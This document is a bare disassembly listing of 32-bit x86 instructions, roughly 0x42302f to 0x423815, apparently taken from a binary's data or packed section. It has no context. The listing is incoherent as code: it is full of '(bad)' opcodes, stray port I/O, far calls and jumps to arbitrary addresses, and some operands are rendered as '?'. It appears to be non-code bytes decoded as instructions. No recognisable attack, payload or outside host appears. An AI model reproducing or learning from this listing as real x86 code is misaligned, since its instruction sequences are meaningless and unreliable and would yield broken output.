  42302f:	inc    esi
  423030:	dec    esp
  423031:	sub    al,ah
  423033:	pop    edi
  423034:	sti    
  423035:	lods   eax,DWORD PTR ds:[esi]
  423036:	xor    eax,0x336dae10
  42303b:	ins    DWORD PTR es:[edi],dx
  42303c:	mov    BYTE PTR [ebp+0x26],ah
  42303f:	xchg   ecx,eax
  423040:	or     eax,0xb8f20303
  423045:	(bad)
  423048:	shl    DWORD PTR [ecx+0x2b82e04a],cl
  42304e:	stc    
  42304f:	jg     0x42300a
  423051:	fdivr  st,st(3)
  423053:	jg     0x422ff0
  423055:	or     al,0xfa
  423057:	pop    esi
  423058:	(bad)  
  423059:	leave  
  42305a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42305b:	mov    ebx,0x693d0b89
  423060:	ss cs mov ch,0x9
  423064:	mov    eax,ds:0x7649dfa0
  423069:	push   ebx
  42306a:	lock push esp
  42306c:	mov    ebp,0xd0efd5a9
  423071:	or     BYTE PTR [ebx+0x7aee3ee],0xc1
  423078:	mov    esp,DWORD PTR [esi+0x3c948416]
  42307e:	in     eax,0x66
  423080:	jne    0x4230eb
  423082:	mov    bh,0x23
  423084:	mov    edi,DWORD PTR [ebx]
  423086:	mov    eax,ds:0xcbcce476
  42308b:	xchg   edx,eax
  42308c:	popf   
  42308d:	pop    ebp
  42308e:	test   al,0xaf
  423090:	mov    BYTE PTR [ebx+eax*8+0x5e],cl
  423094:	xchg   ebp,eax
  423095:	jge    0x423021
  423097:	xor    ah,bh
  423099:	jo     0x423100
  42309b:	jns    0x423032
  42309d:	push   es
  42309e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42309f:	dec    ecx
  4230a0:	add    bl,dl
  4230a2:	bound  edx,QWORD PTR [ebx-0x12]
  4230a5:	sub    eax,0xeae07905
  4230aa:	inc    edi
  4230ab:	mov    eax,0xc851fee2
  4230b0:	(bad)  
  4230b2:	jecxz  0x423106
  4230b4:	stos   BYTE PTR es:[edi],al
  4230b5:	sbb    eax,0xe2c09d0a
  4230ba:	gs xchg esi,eax
  4230bc:	sbb    eax,0xb5212810
  4230c1:	inc    ebx
  4230c2:	inc    ebx
  4230c3:	mov    esi,0xd6317a4f
  4230c8:	sahf   
  4230c9:	xor    DWORD PTR [eax+0x65],edi
  4230cc:	xor    al,0x34
  4230ce:	imul   esp,DWORD PTR [edi],0xffffffa4
  4230d1:	out    0x29,eax
  4230d3:	fadd   QWORD PTR [ebp+0x374f0e17]
  4230d9:	sub    BYTE PTR [ebp-0x46],cl
  4230dc:	xchg   ebx,eax
  4230dd:	jl     0x423118
  4230df:	mov    ah,0x4c
  4230e1:	mov    ebp,0x26433ed5
  4230e6:	add    dh,BYTE PTR [ebp-0x58]
  4230e9:	aam    0xa6
  4230eb:	jae    0x423077
  4230ed:	push   ebx
  4230ee:	lea    edi,[edi-0x4b233898]
  4230f4:	push   ebp
  4230f5:	call   0x6b43:0xce0058d3
  4230fc:	mov    esp,0xf88728b
  423101:	cwde   
  423102:	jns    0x423102
  423104:	xchg   esi,eax
  423105:	movzx  edx,ch
  423108:	inc    edx
  423109:	lds    esp,FWORD PTR [ebp-0x63]
  42310c:	or     BYTE PTR [edi-0xf4c95ac],ah
  423112:	inc    ecx
  423113:	mov    al,0xbf
  423115:	loopne 0x4230d1
  423117:	inc    esi
  423118:	inc    edx
  423119:	rcr    DWORD PTR [ebx+0x3b0538e2],1
  42311f:	jo     0x4230ae
  423121:	bound  ebp,QWORD PTR [eax+0x48bf2299]
  423127:	mov    BYTE PTR [esi+ebp*2-0x6e],dh
  42312b:	sub    DWORD PTR [edx+0x1],eax
  42312e:	xor    edi,DWORD PTR [edx]
  423130:	pop    ss
  423131:	out    dx,eax
  423132:	test   eax,0xdf53a699
  423137:	push   0x9b7e2e67
  42313c:	inc    ebx
  42313d:	jbe    0x4230f4
  42313f:	nop
  423140:	pop    esi
  423141:	outs   dx,BYTE PTR ds:[esi]
  423142:	pop    eax
  423143:	into   
  423144:	aam    0x74
  423146:	rcl    DWORD PTR [edx+eiz*1+0x35],cl
  42314a:	outs   dx,DWORD PTR ds:[esi]
  42314b:	scas   eax,DWORD PTR es:[edi]
  42314c:	and    BYTE PTR [edx+ebx*8+0x20649d9b],bh
  423153:	adc    esp,esi
  423155:	(bad)  
  423157:	and    eax,DWORD PTR [edi+0x15]
  42315a:	or     DWORD PTR [ecx-0x726cc04a],ebx
  423160:	lods   al,BYTE PTR ds:[esi]
  423161:	(bad)
  423165:	xor    al,0xd9
  423167:	xor    BYTE PTR [edx+0x5c],0xd7
  42316b:	xor    al,0xb7
  42316d:	call   DWORD PTR [ecx-0x7828b1aa]
  423173:	pop    eax
  423174:	loop   0x4231bb
  423176:	fsub   DWORD PTR [edx]
  423178:	add    esi,esi
  42317a:	sub    bl,BYTE PTR [ecx]
  42317c:	aad    0xe3
  42317e:	add    al,0x99
  423180:	jle    0x423137
  423182:	or     ah,BYTE PTR [esi+ecx*1]
  423185:	push   edx
  423186:	daa    
  423187:	sub    al,0x92
  423189:	push   esi
  42318a:	es pop ebp
  42318c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318d:	div    BYTE PTR [edi-0x4361bc18]
  423193:	mov    cl,0xe7
  423195:	loop   0x423166
  423197:	daa    
  423198:	(bad)  
  423199:	scas   eax,DWORD PTR es:[edi]
  42319a:	pop    ss
  42319b:	xor    esp,DWORD PTR [esi-0x22]
  42319e:	dec    esi
  42319f:	je     0x42319c
  4231a1:	cmp    DWORD PTR [eax+0x51],edx
  4231a4:	add    DWORD PTR [eax+eiz*4+0x374ecd4e],esp
  4231ab:	aam    0x42
  4231ad:	inc    eax
  4231ae:	xchg   esp,eax
  4231af:	adc    BYTE PTR [si],0x2c
  4231b3:	sbb    bl,BYTE PTR [esi]
  4231b5:	aas    
  4231b6:	xchg   ebp,eax
  4231b7:	or     al,0x5a
  4231b9:	sub    DWORD PTR [esi*8+0x41d50965],ebp
  4231c0:	mov    edi,0x93ba0d4c
  4231c5:	cmp    eax,0xa01a98c
  4231ca:	sub    edx,DWORD PTR [ecx]
  4231cc:	push   edi
  4231cd:	dec    edi
  4231ce:	and    ch,BYTE PTR [edi+0x2f257fca]
  4231d4:	out    0xf7,al
  4231d6:	scas   al,BYTE PTR es:[edi]
  4231d7:	bnd ret 0x292f
  4231db:	enter  0xc305,0xe9
  4231df:	call   DWORD PTR [edi]
  4231e1:	pop    ebx
  4231e2:	in     al,0xc1
  4231e4:	ret    
  4231e5:	ja     0x4231d3
  4231e7:	je     0x423218
  4231e9:	jl     0x42321c
  4231eb:	xlat   BYTE PTR ds:[ebx]
  4231ec:	mov    dh,0x70
  4231ee:	or     DWORD PTR [esp+ebp*4+0x1],edi
  4231f2:	outs   dx,BYTE PTR ds:[esi]
  4231f3:	sub    eax,ecx
  4231f5:	mov    dh,ch
  4231f7:	add    ch,BYTE PTR [edi]
  4231f9:	out    0x2d,eax
  4231fb:	jge    0x423272
  4231fd:	xor    al,0xc2
  4231ff:	lds    ebp,FWORD PTR [eax]
  423201:	out    dx,eax
  423202:	mov    al,0xab
  423204:	test   DWORD PTR fs:[ebx],ebx
  423207:	push   0x39
  423209:	push   esp
  42320a:	push   esi
  42320b:	inc    ecx
  42320c:	or     DWORD PTR [esi+0x202cc02f],edx
  423212:	ficom  DWORD PTR [ebx]
  423214:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423216:	xchg   esp,eax
  423217:	icebp  
  423218:	pop    ss
  423219:	push   esp
  42321a:	in     eax,dx
  42321b:	in     eax,0xa0
  42321d:	pusha  
  42321e:	mov    eax,ds:0xd1dd9394
  423223:	push   ebx
  423224:	ret    0x6f0f
  423227:	xchg   BYTE PTR [eax+0x662feda4],ah
  42322d:	nop
  42322e:	pop    ss
  42322f:	dec    ebx
  423230:	sub    BYTE PTR [ebx-0x74],bh
  423233:	add    eax,0x55a67260
  423238:	ins    DWORD PTR es:[edi],dx
  423239:	test   edx,ebx
  42323b:	mov    ds:0x50e76503,al
  423240:	sbb    ebp,edi
  423242:	pushf  
  423243:	inc    ebx
  423244:	popa   
  423245:	and    dh,BYTE PTR [eax]
  423247:	and    edx,DWORD PTR [esi]
  423249:	lods   eax,DWORD PTR ds:[esi]
  42324a:	(bad)  
  42324c:	cmc    
  42324d:	and    al,dl
  42324f:	xchg   esp,eax
  423250:	mov    ebx,0x978b601e
  423255:	stos   DWORD PTR es:[edi],eax
  423256:	popf   
  423257:	push   ebp
  423258:	pushf  
  423259:	mov    gs,ecx
  42325b:	ret    
  42325c:	mov    edx,0x2827a176
  423261:	(bad)  
  423262:	jmp    DWORD PTR [ecx]
  423264:	test   eax,0x31b9a02c
  423269:	ret    0x80d8
  42326c:	adc    BYTE PTR [ebx-0x59],0xf6
  423270:	push   es
  423271:	fldcw  WORD PTR [ebx+0x4f2e1e7c]
  423277:	mov    eax,ds:0xa522327
  42327c:	fwait
  42327d:	iret   
  42327e:	sbb    DWORD PTR [edi],edx
  423280:	xchg   esi,eax
  423281:	jns    0x423292
  423283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423284:	add    eax,0xd0fc5eda
  423289:	mov    esp,0xffc586fc
  42328e:	push   ebp
  42328f:	aam    0xd9
  423291:	pop    eax
  423292:	inc    ebp
  423293:	sbb    DWORD PTR [ebx],edi
  423295:	outs   dx,BYTE PTR ds:[esi]
  423296:	je     0x4232bf
  423298:	mov    ecx,ecx
  42329a:	adc    BYTE PTR [esi-0x11],ah
  42329d:	aad    0x6e
  42329f:	jnp    0x4232d9
  4232a1:	pop    es
  4232a2:	rol    ch,0x60
  4232a5:	dec    esi
  4232a6:	int3   
  4232a7:	mov    bh,0xde
  4232a9:	imul   esi,DWORD PTR [eax+0x797e7136],0x621fb321
  4232b3:	sbb    edi,DWORD PTR [ecx+0x78]
  4232b6:	ja     0x4232e6
  4232b8:	dec    esi
  4232b9:	fstp   DWORD PTR [ebx+0x78]
  4232bc:	inc    ecx
  4232bd:	lea    esi,[edi]
  4232bf:	mov    ebx,0x12566589
  4232c4:	fbstp  TBYTE PTR [ebx]
  4232c6:	sti    
  4232c7:	mov    al,0x89
  4232c9:	data16 xor bh,BYTE PTR [ecx]
  4232cc:	out    dx,al
  4232cd:	ret    0xee9d
  4232d0:	sti    
  4232d1:	cdq    
  4232d2:	stos   BYTE PTR es:[edi],al
  4232d3:	cmp    bl,BYTE PTR [ecx]
  4232d5:	adc    ax,0xf7d0
  4232d9:	sub    DWORD PTR [edx-0x7b],eax
  4232dc:	xlat   BYTE PTR ds:[ebx]
  4232dd:	pop    edi
  4232de:	aad    0x8
  4232e0:	or     ebx,DWORD PTR [edx-0x76]
  4232e3:	(bad)  
  4232e4:	retf   0x58af
  4232e7:	stos   BYTE PTR es:[edi],al
  4232e8:	fistp  QWORD PTR [ecx-0x64a3544f]
  4232ee:	cdq    
  4232ef:	jp     0x4232d0
  4232f1:	call   0x38ce:0xbaeb3d1d
  4232f8:	ins    BYTE PTR es:[edi],dx
  4232f9:	mov    ebp,ecx
  4232fb:	or     BYTE PTR [ecx-0x21],0x64
  4232ff:	dec    ecx
  423300:	add    al,0x84
  423302:	call   0x900b:0xe5c87720
  423309:	sbb    al,0xef
  42330b:	out    0xe2,eax
  42330d:	mov    ah,0x39
  42330f:	cmp    al,0x68
  423311:	fst    QWORD PTR [edx]
  423313:	and    al,0x11
  423315:	add    DWORD PTR [esi-0x75],eax
  423318:	aaa    
  423319:	xchg   edi,eax
  42331a:	leave  
  42331b:	cmp    bl,BYTE PTR [ecx-0x28]
  42331e:	call   0x1b4ae3b1
  423323:	ins    BYTE PTR es:[edi],dx
  423324:	or     edi,ebp
  423326:	adc    BYTE PTR [ebp-0x6c89939f],0x20
  42332d:	or     cl,BYTE PTR [eax+esi*2+0x4e]
  423331:	push   edx
  423332:	(bad)  
  423333:	jnp    0x4233aa
  423335:	pop    ebp
  423336:	shr    DWORD PTR [eax+0xb],1
  423339:	cdq    
  42333a:	sbb    al,0x4f
  42333d:	aaa    
  42333e:	scas   al,BYTE PTR es:[edi]
  42333f:	adc    dl,BYTE PTR [ebx+esi*1]
  423342:	test   al,0x90
  423344:	pop    es
  423345:	pop    esp
  423346:	pop    ss
  423347:	iret   
  423348:	pushf  
  423349:	gs jge 0x423310
  42334c:	mov    ds:0xd65383ed,eax
  423351:	and    ah,dh
  423353:	push   ss
  423354:	lds    ecx,FWORD PTR [edx+0x71]
  423357:	ret    0xcca5
  42335a:	in     al,0xd7
  42335c:	repz in eax,dx
  42335e:	inc    esi
  42335f:	mov    DWORD PTR [esi],edi
  423361:	xor    ah,BYTE PTR [esi+0x60f16a66]
  423367:	dec    esp
  423368:	int    0xf7
  42336a:	adc    al,0xf5
  42336c:	sub    eax,0xdfabe80c
  423371:	lds    eax,FWORD PTR [esi+0x180cc15c]
  423377:	mov    WORD PTR [ecx+0x7e],?
  42337a:	pusha  
  42337b:	xor    bl,bh
  42337d:	scas   al,BYTE PTR es:[edi]
  42337e:	cmp    dh,BYTE PTR [edi]
  423380:	xchg   edi,eax
  423381:	jmp    0x9a986c82
  423386:	test   DWORD PTR [ecx],0x2f5b5b2b
  42338c:	out    0xad,eax
  42338e:	inc    esi
  42338f:	and    eax,0x1555ed5
  423394:	or     al,0x0
	...
  4233aa:	push   eax
  4233ab:	dec    esi
  4233ac:	dec    edi
  4233ad:	push   esi
  4233ae:	pop    edi
  4233af:	push   edi
  4233b0:	pop    ecx
  4233b1:	dec    esi
  4233b2:	idiv   BYTE PTR [ebx+0x53]
  4233b5:	jns    0x423423
  4233b7:	pusha  
  4233b8:	inc    ecx
  4233b9:	or     ecx,DWORD PTR [esi-0x2cfffe3f]
  4233bf:	push   es
  4233c0:	add    BYTE PTR [eax],al
  4233c2:	fucomi st,st(2)
  4233c4:	pop    edx
  4233c5:	shr    DWORD PTR [edx-0x6e],0xb8
  4233c9:	aad    0x2b
  4233cb:	ret    0x4317
  4233ce:	ins    BYTE PTR es:[edi],dx
  4233cf:	and    BYTE PTR [edx+0x50d31b33],ah
  4233d5:	pop    esp
  4233d6:	inc    edi
  4233d7:	or     edi,esi
  4233d9:	mov    dh,0x1e
  4233db:	inc    eax
  4233dc:	ins    BYTE PTR es:[edi],dx
  4233dd:	stc    
  4233de:	imul   esi,DWORD PTR ds:0x96254699,0x9d9b3f27
  4233e8:	sub    eax,0x5f24b3be
  4233ed:	retf   
  4233ee:	adc    BYTE PTR [edx+0x5a],bl
  4233f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f2:	pop    ebx
  4233f3:	xchg   esp,eax
  4233f4:	adc    al,0x2d
  4233f6:	sbb    dl,BYTE PTR [ebp+0x13201c5b]
  4233fc:	pop    DWORD PTR [edi]
  4233fe:	sbb    ebx,ebp
  423400:	mov    cl,0xfa
  423402:	ja     0x423407
  423404:	or     eax,0x1efffce6
  423409:	dec    ebx
  42340a:	mov    esi,?
  42340c:	fsub   DWORD PTR [edx+0x7ca9a96d]
  423412:	inc    ebx
  423413:	pushf  
  423414:	cs into 
  423416:	sbb    edx,DWORD PTR ds:0xd63427f0
  42341c:	xchg   esi,eax
  42341d:	mov    edi,0xf19897b1
  423422:	loopne 0x423414
  423424:	test   eax,0x7d4d4cf7
  423429:	(bad)
  42342c:	dec    edx
  42342d:	lahf   
  42342e:	daa    
  42342f:	call   0xc57c:0xdc5157d1
  423436:	inc    eax
  423437:	(bad)  
  423438:	fbld   TBYTE PTR [ebp+eiz*2-0x616d8d38]
  42343f:	sbb    eax,0x62e7d4f8
  423444:	xchg   edi,eax
  423445:	cs push ecx
  423447:	mov    dl,0x15
  423449:	int    0x36
  42344b:	mov    eax,0x26a7d1e
  423450:	sbb    ebp,DWORD PTR [eax]
  423452:	pusha  
  423453:	cmp    eax,0x314763db
  423458:	jmp    FWORD PTR [eax+ecx*1+0x6d67938c]
  42345f:	inc    edx
  423460:	jo     0x423429
  423462:	test   eax,0xe252d66c
  423467:	les    eax,FWORD PTR [ecx]
  423469:	stos   DWORD PTR es:[edi],eax
  42346a:	push   esi
  42346b:	cmp    al,0x48
  42346d:	iret   
  42346e:	in     al,0x93
  423470:	bnd jo 0x4234c2
  423473:	in     eax,0x36
  423475:	scas   eax,DWORD PTR es:[edi]
  423476:	cmp    al,0xdb
  423478:	jge    0x4234aa
  42347a:	clc    
  42347b:	sbb    dl,BYTE PTR [edx-0x3266af58]
  423481:	xchg   BYTE PTR [eax+edx*1-0x3279cde7],bh
  423488:	adc    eax,0x9a8267f1
  42348d:	mov    bh,0xf8
  42348f:	mov    cl,0x1b
  423491:	fistp  QWORD PTR [ecx+0x4a02fce7]
  423497:	add    eax,0x4cde944
  42349c:	adc    bl,BYTE PTR ds:0xea8155cd
  4234a2:	xchg   esp,eax
  4234a3:	sbb    eax,0x245008ee
  4234a8:	ins    DWORD PTR es:[edi],dx
  4234a9:	xlat   BYTE PTR ds:[ebx]
  4234aa:	cmp    ebp,DWORD PTR [ebp+0x17]
  4234ad:	outs   dx,BYTE PTR ds:[esi]
  4234ae:	jp     0x4234ff
  4234b0:	(bad)  
  4234b1:	sbb    edx,DWORD PTR [edi+edi*2+0x7a07f03c]
  4234b8:	imul   al
  4234ba:	rcr    ah,0x78
  4234bd:	or     bl,BYTE PTR [ecx+0x29b1aee5]
  4234c3:	mov    eax,ds:0xda14f4bf
  4234c8:	mov    esi,0xeb4629f1
  4234cd:	lahf   
  4234ce:	dec    eax
  4234cf:	pop    es
  4234d0:	adc    BYTE PTR [eax-0x7d],ah
  4234d3:	mov    ebp,DWORD PTR [edx-0x42]
  4234d6:	ja     0x4234b6
  4234d8:	and    eax,0x6c188781
  4234dd:	popf   
  4234de:	(bad)  
  4234e0:	retf   
  4234e1:	(bad)  [eax+eiz*8+0x2d863d8c]
  4234e8:	clc    
  4234e9:	lds    edx,FWORD PTR [ecx+edi*2-0x5b65e304]
  4234f0:	pop    esp
  4234f1:	pop    ds
  4234f2:	adc    BYTE PTR [ebx+0x67],bh
  4234f5:	fs sti 
  4234f7:	sbb    esp,DWORD PTR [ecx]
  4234f9:	cmp    eax,0x32b54736
  4234fe:	std    
  4234ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423500:	lahf   
  423501:	pop    edi
  423502:	sbb    al,0x9f
  423504:	popa   
  423505:	fdiv   DWORD PTR [ecx+0x2c]
  423508:	dec    edi
  423509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42350a:	xchg   esp,eax
  42350b:	lahf   
  42350c:	adc    eax,0x4c46f78a
  423511:	xchg   DWORD PTR [edi],esp
  423513:	sti    
  423514:	outs   dx,BYTE PTR ds:[esi]
  423515:	mov    cl,dl
  423517:	fadd   QWORD PTR [ebx+0x51ede43c]
  42351d:	enter  0x1b2a,0xe3
  423521:	sub    bh,BYTE PTR [ebx-0x66]
  423524:	push   ds
  423525:	or     ebx,DWORD PTR [eax-0x4c]
  423528:	fisubr WORD PTR ds:0xe9f030cc
  42352e:	mov    bl,0xf5
  423530:	ja     0x4234d8
  423532:	mov    dh,0xe
  423534:	sub    dh,BYTE PTR ds:[eax-0x80]
  423538:	push   0x70a1954f
  42353d:	in     al,0x35
  42353f:	fistp  QWORD PTR [ebx+0xf3d08ff]
  423545:	je     0x42353a
  423547:	test   al,0x74
  423549:	inc    esi
  42354a:	aam    0xf0
  42354c:	inc    ebp
  42354d:	dec    edi
  42354e:	or     dl,BYTE PTR [edi+edx*4-0xce1c25c]
  423555:	pushf  
  423556:	add    cl,BYTE PTR [edi-0x6c771a71]
  42355c:	lea    ebp,[ebx]
  42355e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42355f:	mov    ds:0xe21149e1,eax
  423564:	mov    ds:0xc1ea1893,eax
  423569:	ja     0x4235d4
  42356b:	jb     0x4235cb
  42356d:	test   BYTE PTR [edi],0xde
  423570:	xor    al,0xdc
  423572:	pop    edx
  423573:	call   0xf5a1:0xed5a0da1
  42357a:	shl    bh,1
  42357c:	pop    esp
  42357d:	mov    ebx,0xd0f1efe5
  423582:	and    cl,ch
  423584:	mov    BYTE PTR [ecx-0x5],bh
  423587:	push   ss
  423588:	ja     0x4235e7
  42358a:	popa   
  42358b:	out    dx,eax
  42358c:	ror    DWORD PTR [edi+eiz*1+0x1d],0xdb
  423591:	or     ebp,DWORD PTR [ebx]
  423593:	jecxz  0x4235ba
  423595:	jo     0x4235a2
  423597:	fadd   QWORD PTR [edx-0x66eb674d]
  42359d:	mov    ebx,ecx
  42359f:	jno    0x4235c6
  4235a1:	ret    0x4de9
  4235a4:	mov    bl,0x46
  4235a6:	adc    al,0x2
  4235a8:	andps  xmm0,XMMWORD PTR [ebp+0x49]
  4235ac:	mov    DWORD PTR [esi+0x17b6b871],edx
  4235b2:	jle    0x423547
  4235b4:	popf   
  4235b5:	gs scas eax,DWORD PTR es:[edi]
  4235b7:	jl     0x42353b
  4235b9:	inc    ebp
  4235ba:	dec    eax
  4235bb:	cmp    DWORD PTR [esi],esi
  4235bd:	sbb    bl,0x55
  4235c0:	(bad)  
  4235c1:	test   eax,0x747e285
  4235c6:	push   edi
  4235c7:	je     0x423560
  4235c9:	jnp    0x42363f
  4235cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235cc:	retf   
  4235cd:	pop    esp
  4235ce:	adc    al,0xd7
  4235d0:	(bad)  
  4235d1:	fst    QWORD PTR [eax-0x75ec389b]
  4235d7:	aam    0x51
  4235d9:	ss ss jp 0x4235d2
  4235dd:	loop   0x4235f0
  4235df:	ror    DWORD PTR [eax-0x74bf3691],1
  4235e5:	cmp    eax,0x7adf3a2
  4235ea:	in     al,0xc2
  4235ec:	jnp    0x423647
  4235ee:	add    DWORD PTR [ebp-0x70],ecx
  4235f1:	mov    eax,ds:0x3162e018
  4235f6:	push   edx
  4235f7:	inc    esi
  4235f8:	mov    edx,esp
  4235fa:	jbe    0x4235e8
  4235fc:	mov    edx,0x6814ccfc
  423601:	(bad)  
  423603:	sub    eax,0x939a0168
  423608:	cmp    edx,edx
  42360a:	xchg   BYTE PTR [ebp+0x187f320c],al
  423610:	daa    
  423611:	sub    al,0x12
  423613:	xor    eax,0xa68a29df
  423618:	out    0x1d,eax
  42361a:	mov    edi,0x79993d09
  42361f:	jno    0x42367e
  423621:	add    dh,BYTE PTR [esi+0x21c5b909]
  423627:	popf   
  423628:	inc    esi
  423629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42362a:	jns    0x4235f1
  42362c:	mov    ebp,0xd44fc25f
  423631:	leave  
  423632:	pop    esp
  423633:	add    eax,0x5ed5501b
  423638:	pop    ss
  423639:	aam    0x64
  42363b:	pusha  
  42363c:	(bad)  
  42363e:	rcl    DWORD PTR [edi+edi*2-0xbf7ccaf],1
  423645:	push   edx
  423646:	mov    eax,0x3bf20189
  42364b:	repz clc 
  42364d:	sar    BYTE PTR [ebx+0x2bc5bd4e],0xa7
  423654:	pop    ds
  423655:	jecxz  0x4236b0
  423657:	aad    0x77
  423659:	in     al,0xd9
  42365b:	mov    ds:0x5de761cc,eax
  423660:	call   0x62e78cd3
  423665:	push   esp
  423666:	push   0xffffffd3
  423668:	pop    esi
  423669:	clc    
  42366a:	arpl   WORD PTR [ecx+eiz*2+0x682f16b2],bp
  423671:	xor    BYTE PTR [esp+esi*4+0x70],ch
  423675:	or     bh,BYTE PTR [ebp+0x3f]
  423678:	xor    bl,ch
  42367a:	idiv   DWORD PTR [ecx]
  42367c:	out    0x81,al
  42367e:	push   edi
  42367f:	(bad)  
  423680:	out    dx,al
  423681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423682:	jmp    0x42363a
  423684:	push   eax
  423685:	mov    ds:0x5ea1f35f,al
  42368a:	cmp    eax,0x9b0ae21c
  42368f:	repz mov ebp,0x24b9d0e0
  423695:	in     al,0xa4
  423697:	stos   BYTE PTR es:[edi],al
  423698:	retf   0xa4a3
  42369b:	sar    BYTE PTR [esi-0x5a],cl
  42369e:	call   0xca3065c4
  4236a3:	mov    ebp,0x2c133be1
  4236a8:	ds aaa 
  4236aa:	add    al,0x94
  4236ac:	addr16 fsub st,st(2)
  4236af:	sub    eax,0x66194a47
  4236b4:	inc    esi
  4236b5:	stos   DWORD PTR es:[edi],eax
  4236b6:	mov    eax,0x6e3a46a4
  4236bb:	pop    eax
  4236bc:	push   ds
  4236bd:	cli    
  4236be:	aaa    
  4236bf:	mov    ds:0xcba01f7d,eax
  4236c4:	push   ebx
  4236c5:	cmp    eax,DWORD PTR [esi+0x3]
  4236c8:	inc    ebx
  4236c9:	jo     0x4236fc
  4236cb:	xor    al,0x56
  4236cd:	inc    eax
  4236ce:	outs   dx,DWORD PTR ds:[esi]
  4236cf:	push   edi
  4236d0:	in     al,0x4
  4236d2:	xor    ebx,esi
  4236d4:	xchg   DWORD PTR [ebx-0x77],edx
  4236d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236d8:	popf   
  4236d9:	icebp  
  4236da:	popa   
  4236db:	dec    ebp
  4236dc:	repz and edx,DWORD PTR [ecx+eax*4]
  4236e0:	int3   
  4236e1:	cdq    
  4236e2:	arpl   WORD PTR [ecx+0x1a391108],bp
  4236e8:	mov    ah,0x22
  4236ea:	fsubrp st(1),st
  4236ec:	sbb    esp,DWORD PTR [edi+0x785e92a0]
  4236f2:	hlt    
  4236f3:	js     0x42372a
  4236f5:	add    BYTE PTR [ebx-0x1d],0x82
  4236f9:	or     BYTE PTR [esi-0x7d],0x2b
  4236fd:	mov    DWORD PTR [ebp-0xae12100],esp
  423703:	sbb    DWORD PTR [eax+0x68],edx
  423706:	pusha  
  423707:	jnp    0x4236f1
  423709:	xor    esi,0x22
  42370c:	push   edi
  42370d:	jno    0x42372b
  42370f:	imul   ebx,DWORD PTR [edi+edx*2],0xffffffda
  423713:	loop   0x423714
  423715:	inc    eax
  423716:	cmp    edx,DWORD PTR [ecx+edi*8+0x47]
  42371a:	cmc    
  42371b:	sbb    edx,DWORD PTR [ebx-0xc]
  42371e:	das    
  42371f:	and    DWORD PTR [edx-0x45],ebp
  423722:	sahf   
  423723:	mov    ch,0x65
  423725:	punpckldq mm5,DWORD PTR [edi]
  423728:	or     DWORD PTR [edx+eiz*2-0x77],ecx
  42372c:	cmp    DWORD PTR [ebx-0x3e],esp
  42372f:	inc    ecx
  423730:	mov    ecx,0x86c0f68
  423735:	jne    0x42374b
  423737:	stos   BYTE PTR es:[edi],al
  423738:	cmp    DWORD PTR ds:0xc1d1076c,0xaf4fdb77
  423742:	in     al,dx
  423743:	mov    ds:0x2ebc0ce2,eax
  423748:	call   0xa9821394
  42374d:	mov    ah,0x91
  42374f:	push   es
  423750:	jmp    0xc3d5:0x2aea5e93
  423757:	out    dx,al
  423758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423759:	jbe    0x4236e2
  42375b:	mov    edx,0x86930e
  423760:	jle    0x423739
  423762:	stc    
  423763:	shl    ebp,1
  423765:	retf   0x3144
  423768:	mov    esi,0xbb388cba
  42376d:	jae    0x423774
  42376f:	and    BYTE PTR [eax],ch
  423771:	xchg   ebx,eax
  423772:	scas   al,BYTE PTR es:[edi]
  423773:	xor    DWORD PTR [ebp-0x8],edi
  423776:	jg     0x4237da
  423778:	mov    dl,ch
  42377a:	pop    es
  42377b:	pop    ecx
  42377c:	iret   
  42377d:	sbb    edx,DWORD PTR [eax+0x4d0d47fd]
  423783:	sbb    al,0xaf
  423785:	cmp    BYTE PTR [edx-0x3ac8d81f],dl
  42378b:	repz data16 (bad) 
  42378f:	lods   al,BYTE PTR ds:[esi]
  423790:	or     DWORD PTR [esi-0x11],esp
  423793:	or     dh,0x1e
  423796:	retf   
  423797:	stos   DWORD PTR es:[edi],eax
  423798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423799:	mov    WORD PTR [ebp-0x7f783816],cs
  42379f:	(bad)  
  4237a0:	xor    eax,0x9ba40899
  4237a5:	loope  0x423803
  4237a7:	mov    ecx,0x6bd301d9
  4237ac:	or     BYTE PTR [ebx-0x58ac4a71],dh
  4237b2:	jmp    0xccdb3e3d
  4237b7:	int    0x2
  4237b9:	mov    eax,ds:0xf522e31f
  4237be:	fnstcw WORD PTR [edx+edx*4]
  4237c1:	test   eax,0x8a6c9282
  4237c6:	lods   eax,DWORD PTR ds:[esi]
  4237c7:	bound  edx,QWORD PTR [ebp*8+0x3e6ac6f4]
  4237ce:	pop    ebp
  4237cf:	jo     0x4237fe
  4237d1:	neg    BYTE PTR [ebp-0x75]
  4237d4:	lods   eax,DWORD PTR ds:[esi]
  4237d5:	and    eax,0xf6c7c49d
  4237da:	dec    ebx
  4237db:	push   ebx
  4237dc:	in     al,dx
  4237dd:	cmp    DWORD PTR [eax],ebx
  4237df:	mov    bl,0x8a
  4237e1:	(bad)  
  4237e2:	(bad)  
  4237e3:	xor    bl,BYTE PTR gs:[ebp-0x3f]
  4237e7:	cmp    ch,BYTE PTR [esi+0x42]
  4237ea:	retf   0x1074
  4237ed:	jmp    0x7798:0x9310fbb9
  4237f4:	sub    ah,dh
  4237f6:	imul   DWORD PTR [ecx]
  4237f8:	cdq    
  4237f9:	jnp    0x4237c8
  4237fb:	stc    
  4237fc:	mov    dl,0x1a
  4237fe:	xor    ah,BYTE PTR [esi-0x16]
  423801:	pushf  
  423802:	jge    0x42385a
  423804:	sbb    cl,bl
  423806:	add    eax,0xd59ff31f
  42380b:	in     eax,dx
  42380c:	inc    edi
  42380d:	dec    edi
  42380e:	jmp    DWORD PTR [ecx]
  423810:	adc    eax,0x6d7c09b0
  423815:	out    dx,al
